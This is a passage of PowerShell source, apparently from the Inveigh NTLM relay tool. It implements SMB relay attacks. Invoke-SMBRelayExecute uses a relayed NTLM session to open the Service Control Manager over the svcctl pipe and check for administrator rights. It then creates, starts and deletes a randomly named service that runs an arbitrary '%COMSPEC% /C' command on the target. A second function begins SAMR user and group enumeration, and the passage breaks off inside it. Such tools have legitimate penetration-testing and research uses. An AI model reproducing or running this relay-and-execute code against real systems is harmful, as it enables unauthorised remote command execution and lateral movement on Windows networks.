                if($FailedLoginStrict -eq 'Y' -or ($HTTP_NTLM_domain_string -and ((!$target_hostname -or !$target_DNS_domain) -or ($target_hostname -and $target_DNS_domain -and $target_hostname -ne $target_DNS_domain))))
                {

                    if(!$inveigh.relay_failed_login_table.ContainsKey($HTTP_username_full))
                    {
                        $inveigh.relay_failed_login_table.Add($HTTP_username_full,[Array]$target)
                    }
                    else
                    {
                        $inveigh.relay_failed_login_table.$HTTP_username_full += $target
                    }

                }

                $SMB_relay_failed = $true
                $client.Close()
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication failed for $HTTP_username_full on $Target") > $null
            }

        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $SMB_relay_failed = $true
        }

        return $SMB_relay_failed
    }

    function Get-StatusPending
    {
        param ([Byte[]]$Status)

        if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
        {
            $status_pending = $true
        }

        return $status_pending
    }
    
    function Invoke-SMBRelayExecute
    {
        param ($client,$SMB_version,$SMB_user_ID,$session_ID,$SMB_process_ID,$AccessCheck)

        $client_receive = New-Object System.Byte[] 1024

        if(!$Service)
        {
            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace "-00",""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}   
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($Service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
            
            }

        }

        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)
        $Command = "%COMSPEC% /C `"" + $Command + "`""
        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $SMBExec_command += '00-00'
        }
        else
        {
            $SMBExec_command += '00-00-00-00'
        }    
    
        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)
        $SMB_path = "\\" + $Target + "\IPC$"
        $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        $named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03
        $client_stream = $client.GetStream()
        $SMB_split_index = 4256
        $stage = 'TreeConnect'
        $message_ID =  $inveigh.session_message_ID_table[$inveigh.session_count]

        while ($stage -ne 'Exit')
        {

            try
            {
                
                switch ($stage)
                {
        
                    'CheckAccess'
                    {
                        
                        if([System.BitConverter]::ToString($client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $client_receive[108..127]
                            $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full has command execution privilege on $target") > $null

                            if($inveigh.domain_mapping_table.ContainsKey($HTTP_NTLM_domain_string))
                            {
                                $privileged_user = ($HTTP_NTLM_user_string + "@" + $inveigh.domain_mapping_table.$HTTP_NTLM_domain_string).ToUpper()
                            }
                            else
                            {
                                $privileged_user = $HTTP_username_full
                            }

                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                            {

                                if($inveigh.enumerate[$i].IP -eq $target)
                                {
                                    $target_index = $i
                                    break
                                }

                            }

                            [Array]$privileged_user_list = $inveigh.enumerate[$target_index].Privileged
                            
                            if($privileged_user_list -notcontains $privileged_user)
                            {
                                $privileged_user_list += $privileged_user
                                $inveigh.enumerate[$target_index].Privileged = $privileged_user_list
                            }

                            if($AccessCheck)
                            {
                                $SMB_administrator = $true
                                $SMB_close_service_handle_stage = 2
                                $stage = 'CloseServiceHandle'
                            }
                            elseif($SCM_data.Length -lt $SMB_split_index)
                            {
                                $stage = 'CreateServiceW'
                            }
                            else
                            {
                                $stage = 'CreateServiceW_First'
                            }

                        }
                        elseif([System.BitConverter]::ToString($client_receive[128..131]) -eq '05-00-00-00')
                        {
                            
                            if($Attack -notcontains 'Session')
                            {
                                $SMB_relay_failed = $true
                            }

                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full does not have command execution privilege on $Target") > $null
                            $SMB_service_manager_context_handle = $client_receive[108..127]
                            $SMB_close_service_handle_stage = 2
                            $message_ID++
                            $stage = 'CloseServiceHandle'
                        }
                        else
                        {
                            $SMB_relay_failed = $true
                        }

                    }

                    'CloseRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $stage = 'SendReceive'
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service deleted on $Target") > $null
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $stage = 'SendReceive'
                    }

                    'CreateRequest'
                    {
                        $tree_ID = $client_receive[40..43]
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                        $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $stage = 'SendReceive'
                    }
            
                    'CreateServiceW'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $stage = 'SendReceive'
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $message_ID++
                        $stage_current = $stage
                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $stage = 'SendReceive'
                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $message_ID++
                        $stage_current = $stage
                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $stage = 'SendReceive'
                    }

                    'CreateServiceW_Last'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $stage = 'SendReceive'
                    }

                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($client_receive[108..111]) -eq '1d-04-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Command executed on $Target") > $null
                        }
                        elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '02-00-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service failed to start on $Target") > $null
                        }

                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $stage = 'SendReceive'
                    }

                    'Logoff'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $stage = 'SendReceive'
                    }

                    'OpenSCManagerW'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $stage = 'SendReceive'         
                    }

                    'ReadRequest'
                    {
                        Start-Sleep -m 150
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2ReadRequest $SMB_file_ID
                        $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $stage = 'SendReceive'
                    }

                    'RPCBind'
                    {
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $SMB_file_ID = $client_receive[132..147]
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $stage = 'SendReceive'
                    }

                    'SendReceive'
                    {
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'StartServiceW'
                    {

                        if([System.BitConverter]::ToString($client_receive[132..135]) -eq '00-00-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service created on $Target") > $null
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Trying to execute command on $Target") > $null
                            $SMB_service_context_handle = $client_receive[112..131]
                            $message_ID++
                            $stage_current = $stage
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'   
                        }
                        elseif([System.BitConverter]::ToString($client_receive[132..135]) -eq '31-04-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Service $SMB_service creation failed on $Target") > $null
                            $SMB_relay_failed = $true
                        }
                        else
                        {
                            $SMB_relay_failed = $true
                        }

                    }

                    'StatusPending'
                    {
                        $client_stream.Read($client_receive,0,$client_receive.Length)

                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $stage = $stage_next
                        }

                    }

                    'StatusReceived'
                    {

                        switch ($stage_current)
                        {

                            'CloseRequest'
                            {
                                $stage = 'TreeDisconnect'
                            }

                            'CloseServiceHandle'
                            {

                                if($SMB_close_service_handle_stage -eq 2)
                                {
                                    $stage = 'CloseServiceHandle'
                                }
                                else
                                {
                                    $stage = 'CloseRequest'
                                }

                            }

                            'CreateRequest'
                            {
                                $file_ID = $client_receive[132..147]
                                $stage = 'RPCBind'
                            }

                            'CreateServiceW'
                            {
                                $stage = 'ReadRequest'
                                $stage_next = 'StartServiceW'
                            }

                            'CreateServiceW_First'
                            {

                                if($SMB_split_stage_final -le 2)
                                {
                                    $stage = 'CreateServiceW_Last'
                                }
                                else
                                {
                                    $SMB_split_stage = 2
                                    $stage = 'CreateServiceW_Middle'
                                }
                                
                            }

                            'CreateServiceW_Middle'
                            {

                                if($SMB_split_stage -ge $SMB_split_stage_final)
                                {
                                    $stage = 'CreateServiceW_Last'
                                }
                                else
                                {
                                    $stage = 'CreateServiceW_Middle'
                                }

                            }

                            'CreateServiceW_Last'
                            {
                                $stage = 'ReadRequest'
                                $stage_next = 'StartServiceW'
                            }

                            'DeleteServiceW'
                            {
                                $stage = 'ReadRequest'
                                $stage_next = 'CloseServiceHandle'
                                $SMB_close_service_handle_stage = 1
                            }

                            'Logoff'
                            {
                                $stage = 'Exit'
                            }

                            'OpenSCManagerW'
                            {
                                $stage = 'ReadRequest'
                                $stage_next = 'CheckAccess' 
                            }

                            'ReadRequest'
                            {
                                $stage = $stage_next
                            }

                            'RPCBind'
                            {
                                $stage = 'ReadRequest'
                                $stage_next = 'OpenSCManagerW'
                            }

                            'StartServiceW'
                            {
                                $stage = 'ReadRequest'
                                $stage_next = 'DeleteServiceW'  
                            }

                            'TreeConnect'
                            {
                                $tree_ID = $client_receive[40..43]
                                $stage = 'CreateRequest'
                            }

                            'TreeDisconnect'
                            {

                                if($Attack -contains 'Session' -or $Attack -contains 'Execute')
                                {
                                    $inveigh.session_message_ID_table[$inveigh.session_count] = $message_ID
                                    $stage = 'Exit'
                                }
                                else
                                {
                                    $stage = 'Logoff'
                                }

                            }

                        }

                    }

                    'TreeConnect'
                    {
                        $tree_ID = 0x00,0x00,0x00,0x00
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $stage = 'SendReceive'
                    }

                    'TreeDisconnect'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $stage = 'SendReceive'                        
                    }

                   

                }

                if($SMB_relay_failed -and $Attack -notcontains 'Session')
                {
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay failed on $Target") > $null
                    $stage = 'Exit'
                }

            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current") > $null
                $stage = 'Exit'
            }

        }

        if($Attack -contains 'Session')
        {
            return $SMB_administrator
        }
        else
        {
            $client.Close()
        }
            
    }

    function Invoke-SMBRelayEnum
    {
        param ($client,$SMB_user_ID,$session_ID,$process_ID,$Enumerate,$EnumerateGroup)

        $client_receive = New-Object System.Byte[] 81920
        $SMB_signing = $false
        $message_ID =  $inveigh.session_message_ID_table[$inveigh.session_count]
        $action = $Enumerate
        $tree_ID = 0x00,0x00,0x00,0x00
        $group = $EnumerateGroup

        if($Action -eq 'All')
        {
            $action_stage = 'group'
        }
        else
        {
            $action_stage = $Action    
        }

        $path = "\\" + $Target + "\IPC$"
        $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
        $j = 0
        $stage = 'TreeConnect'
        $client_stream = $client.GetStream()
            
        while ($stage -ne 'Exit')
        {

            try
            {
            
                switch ($stage)
                {
        
                    'CloseRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2CloseRequest $file_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }

                    'Connect2'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRConnect2 $Target
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x39,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'Connect5'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRConnect5 $Target
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
